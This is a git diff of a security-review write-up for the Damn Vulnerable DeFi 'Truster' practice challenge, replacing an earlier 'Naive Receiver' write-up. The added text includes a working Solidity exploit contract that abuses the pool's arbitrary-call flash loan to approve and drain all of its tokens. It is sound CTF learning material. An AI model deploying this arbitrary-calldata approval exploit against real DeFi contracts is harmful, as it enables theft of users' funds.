@@ -1,11 +1,11 @@
-# Naive Receiver
+# Truster
 
-Naive Receiver is a [damnn vulnerable defi challenge](https://www.damnvulnerabledefi.xyz/challenges/1.html), There's a lending pool offering quite expensive flash loans of Ether, which has 1000 ETH in balance.
+Truster is a [damnn vulnerable defi challenge](https://www.damnvulnerabledefi.xyz/challenges/3.html), a new pool has launched that is offering flash loans of DVT tokens for free.
 
 # Introduction
 
 <!-- TODO  -->
-Unstoppable offers quite expensive flash loans of ETH.
+Unstoppable offers flash loans of DVT tokens for free, currently the pool has 1 milion DVT tokens in balance.
 
 The focus of the security review was on the following:
 
@@ -16,54 +16,61 @@ The focus of the security review was on the following:
 
 # Findings 
 
-## High Risk
-### Lack of validation of the amount to be borrowed
+## Critical Risk
+### Theft of all DVT tokens
 
-**Severity:** High
+**Severity:** Critical
 
-**Context:** [`NaiveReceiverLenderPool.sol#L21-L41`](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.2.0/contracts/naive-receiver/NaiveReceiverLenderPool.sol#L21-L41)
+**Context:** [`TrusterLenderPool.sol#L21-L41`](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.2.0/contracts/truster/TrusterLenderPool.sol#L21-L41)
 
 **Description:**
-Using the function `flashLoan` is possible to set borrower address and the amount to borrow, the borrower address have to be a `FlashLoanReceiver` contract address deployed by the user, and the amount can be any, because there is no validation for the amount to be borrowed.
-
-If an attacker makes an flash loan setting victim `FlashLoanReceiver` contract address and `amount` 0, the victim will borrow 0 ETH and pay 1 ETH as fee.
-Due to the lack of any restrictions, the attacker can do this as many times as he wants until he steals all the ETH from the victim's contract.
-
+The contract have a function named as `flashLoan`, using this function we can borrow an amount of DVT tokens, this function receive amount to borrow `borrowAmount`, borrower address `borrower`, token address `target` and function called in token `data`.
 
 ```solidity
-contract NaiveReceiverLenderPool {
+contract TrusterLenderPool is ReentrancyGuard {
     ...
-    uint256 private constant FIXED_FEE = 1 ether; // not the cheapest flash loan
-    ...
-    function flashLoan(address borrower, uint256 borrowAmount) external nonReentrant {
+    function flashLoan(
+            uint256 borrowAmount,
+            address borrower,
+            address target,
+            bytes calldata data
+        )
+            external
+            nonReentrant
+        {
+            uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
+            require(balanceBefore >= borrowAmount, "Not enough tokens in pool");
+            
+            damnValuableToken.transfer(borrower, borrowAmount);
+            target.functionCall(data);
 
-        uint256 balanceBefore = address(this).balance;
-        require(balanceBefore >= borrowAmount, "Not enough ETH in pool");
-
-
-        require(borrower.isContract(), "Borrower must be a deployed contract");
-        // Transfer ETH and handle control to receiver
-        borrower.functionCallWithValue(
-            abi.encodeWithSignature(
-                "receiveEther(uint256)",
-                FIXED_FEE
-            ),
-            borrowAmount
-        );
-        
-        require(
-            address(this).balance >= balanceBefore + FIXED_FEE,
-            "Flash loan hasn't been paid back"
-        );
-    }
-    ...
+            uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
+            require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
+        }
 }
 ```
 
-**Recommendation:**
-```diff
-+ Implement validation for the amount to be borrowed, must be greater than zero.
-+ Validate if the person making the flash loan owns the `FlashLoanReceiver` contract.
-- ...
+Using this function an attacker is able to stole all DVT Tokens, creating an exploit contract that call the `flashLoan` function, and passing this value in `data` parameter: `approve(address(this),type(uint).max)`.
+
+```solidity
+contract TrusterExploit {
+    function attack(address _pool, address _token) public {
+        TrusterLenderPool pool = TrusterLenderPool(_pool);
+        IERC20 token = IERC20(_token); 
+
+        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), type(uint).max);
+        pool.flashLoan(0, msg.sender, _token, data);
+
+        token.transferFrom(_pool, msg.sender, token.balanceOf(_pool));
+    }
+}
 ```
 
+In the code above, the exploit encode the data `approve(address(this),type(uint).max)` and send it via `pool.flashLoan` with the rest of the parameters, and this approve your contract to receive unlimited amount of DVT tokens.
+And the following line transfers the entire TrusterLenderPool balance to the exploit contract.
+
+**Recommendation:**
+```diff
++ Do not execute data sent by an external contract within the functionCall.
+- ...
+```
